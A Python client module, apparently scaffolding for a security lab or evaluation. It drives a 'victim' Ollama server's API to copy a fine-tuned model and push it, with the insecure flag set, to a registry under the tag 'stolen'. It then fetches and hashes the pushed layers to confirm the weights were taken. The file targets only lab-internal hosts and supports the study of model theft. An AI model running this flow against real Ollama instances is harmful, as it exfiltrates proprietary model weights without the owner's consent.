"""Shared client for the lab's Ollama victim and local registry.

The victim is the compose service `victim-ollama` (no host port). The registry is
`registry` on the same internal network. Nothing here talks to a host or a public API.
"""
import base64
import hashlib
import json
import time
import urllib.error
import urllib.request

CANARY = "ATLAS-CANARY-w54t"
MODEL = "lantern-ft:latest"
BASE = "qwen2.5:0.5b"
VICTIM = "http://victim-ollama:11434"
REGISTRY = "http://registry:5000"
PUSH_NAME = "registry:5000/lantern/ft:stolen"
BASE_PUSH = "registry:5000/public/qwen2.5:0.5b"
STOLEN_REPO = "lantern/ft"
STOLEN_TAG = "stolen"
BASE_REPO = "public/qwen2.5"
BASE_TAG = "0.5b"
OPERATOR_USER = "lab-operator"
OPERATOR_PASS = "atlas-lab-token"
ACCEPT = "application/vnd.docker.distribution.manifest.v2+json"


class HttpStatus(Exception):
    def __init__(self, status, body):
        super().__init__(f"HTTP {status}")
        self.status = status
        self.body = body


def _open(req, timeout):
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        body = e.read()
        raise HttpStatus(e.code, body) from None


def request(method, url, body=None, headers=None, timeout=60):
    data = None if body is None else json.dumps(body).encode()
    hdrs = {"Content-Type": "application/json"} if body is not None else {}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    return _open(req, timeout)


def get(url, headers=None, timeout=60):
    return request("GET", url, headers=headers, timeout=timeout)


def post(url, body, timeout=60):
    return request("POST", url, body=body, timeout=timeout)


def auth_header():
    token = base64.b64encode(f"{OPERATOR_USER}:{OPERATOR_PASS}".encode()).decode()
    return {"Authorization": f"Basic {token}"}


def tags():
    status, body = get(VICTIM + "/api/tags", timeout=30)
    return status, json.loads(body)


def show(name):
    status, body = post(VICTIM + "/api/show", {"model": name}, timeout=30)
    return status, json.loads(body)


def version():
    status, body = get(VICTIM + "/api/version", timeout=15)
    return status, json.loads(body)


def digest_of(models, name):
    for m in models:
        if m.get("name") == name:
            return m.get("digest", "")
    return ""


def copy_model(source, destination):
    return post(VICTIM + "/api/copy", {"source": source, "destination": destination}, timeout=60)


def push_model(name):
    """Stream /api/push. Returns (seconds, last status, error or '')."""
    payload = json.dumps({"model": name, "insecure": True, "stream": True}).encode()
    req = urllib.request.Request(VICTIM + "/api/push", data=payload, headers={"Content-Type": "application/json"})
    t0 = time.perf_counter()
    last = ""
    try:
        with urllib.request.urlopen(req, timeout=300) as r:
            buf = b""
            while True:
                chunk = r.read(65536)
                if not chunk:
                    break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line.strip():
                        continue
                    obj = json.loads(line)
                    last = obj.get("status", last)
                    if obj.get("error"):
                        return time.perf_counter() - t0, last, obj["error"]
            if buf.strip():
                obj = json.loads(buf)
                last = obj.get("status", last)
                if obj.get("error"):
                    return time.perf_counter() - t0, last, obj["error"]
    except urllib.error.HTTPError as e:
        return time.perf_counter() - t0, last, e.read().decode("utf-8", "replace")[:300]
    return time.perf_counter() - t0, last, ""


def manifest(repo, tag, headers=None):
    hdrs = {"Accept": ACCEPT}
    if headers:
        hdrs.update(headers)
    status, body = get(f"{REGISTRY}/v2/{repo}/manifests/{tag}", headers=hdrs, timeout=30)
    return status, body, json.loads(body)


def blob_sha256(repo, digest, headers=None):
    """Stream a blob and return (sha256 hex, size, seconds)."""
    hdrs = dict(headers or {})
    req = urllib.request.Request(f"{REGISTRY}/v2/{repo}/blobs/{digest}", headers=hdrs)
    t0 = time.perf_counter()
    h = hashlib.sha256()
    size = 0
    try:
        with urllib.request.urlopen(req, timeout=300) as r:
            while True:
                chunk = r.read(1024 * 1024)
                if not chunk:
                    break
                h.update(chunk)
                size += len(chunk)
    except urllib.error.HTTPError as e:
        raise HttpStatus(e.code, e.read()) from None
    return h.hexdigest(), size, time.perf_counter() - t0


def layers(manifest_obj, suffix):
    return [layer for layer in manifest_obj.get("layers", []) if layer.get("mediaType", "").endswith(suffix)]


def timed(fn, trials=5):
    samples = []
    last = None
    for _ in range(trials):
        t0 = time.perf_counter()
        last = fn()
        samples.append((time.perf_counter() - t0) * 1000)
    samples.sort()
    return samples[len(samples) // 2], last


def reach(url, timeout=5):
    """Return (ok, milliseconds, error). ok is True only on HTTP 2xx/3xx/4xx (a reply)."""
    t0 = time.perf_counter()
    try:
        status, _ = get(url, timeout=timeout)
        return True, (time.perf_counter() - t0) * 1000, f"HTTP {status}"
    except HttpStatus as e:
        return True, (time.perf_counter() - t0) * 1000, f"HTTP {e.status}"
    except Exception as e:
        return False, (time.perf_counter() - t0) * 1000, f"{type(e).__name__}: {e}"
